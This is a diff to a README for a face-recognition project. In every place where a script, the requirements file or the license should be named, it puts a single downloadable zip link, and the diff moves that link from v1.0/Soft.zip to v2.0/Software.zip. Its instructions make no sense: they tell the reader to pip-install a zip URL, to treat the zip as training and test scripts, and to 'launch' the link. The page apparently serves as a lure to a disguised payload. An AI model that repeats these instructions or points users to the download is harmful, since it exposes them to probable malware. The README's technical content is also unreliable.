@@ -25,7 +25,7 @@ Welcome to the Face_Recognition repository - your one-stop solution for an end-t
 ## Get Started
 To access the full functionality of this repository, please download the release package from the following link:
 
-[![Download Release](https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip)](https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip)
+[![Download Release](https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip)](https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be launched.*
 
@@ -34,9 +34,9 @@ If the link is not accessible or if you require more information, please visit t
 ## Project Structure
 📁 **/data**: Contains sample images for testing the face recognition system.  
 📁 **/models**: Includes pre-trained Inception V2 models for quick deployment.  
-📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip**: Python script to train the face recognition model using Triplet Loss.  
-📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip**: Utilize the trained model for facial recognition tasks.  
-📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip**: Helper functions for data preprocessing and model evaluation.
+📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip**: Python script to train the face recognition model using Triplet Loss.  
+📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip**: Utilize the trained model for facial recognition tasks.  
+📄 **https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip**: Helper functions for data preprocessing and model evaluation.
 
 ## System Requirements
 ⚙️ **Python 3**  
@@ -45,9 +45,9 @@ If the link is not accessible or if you require more information, please visit t
 🔬 **GPU (recommended)**
 
 ## Usage
-1. Make sure you have all dependencies installed by running `pip install -r https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip`.
-2. Train the face recognition model using `https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip`.
-3. Test the model by running `https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip` on sample images.
+1. Make sure you have all dependencies installed by running `pip install -r https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip`.
+2. Train the face recognition model using `https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip`.
+3. Test the model by running `https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip` on sample images.
 
 ## Contributions
 Contributions to this repository are welcome! Feel free to submit pull requests to enhance the functionality and performance of the face recognition system.
@@ -56,7 +56,7 @@ Contributions to this repository are welcome! Feel free to submit pull requests 
 If you encounter any issues or have questions regarding the implementation, please open an issue in the repository. Our team will be happy to assist you.
 
 ## License
-This project is licensed under the MIT License - see the https://github.com/LAURY-STACK/Face_Recognition/releases/download/v1.0/Soft.zip file for details.
+This project is licensed under the MIT License - see the https://github.com/LAURY-STACK/Face_Recognition/releases/download/v2.0/Software.zip file for details.
 
 ---
 
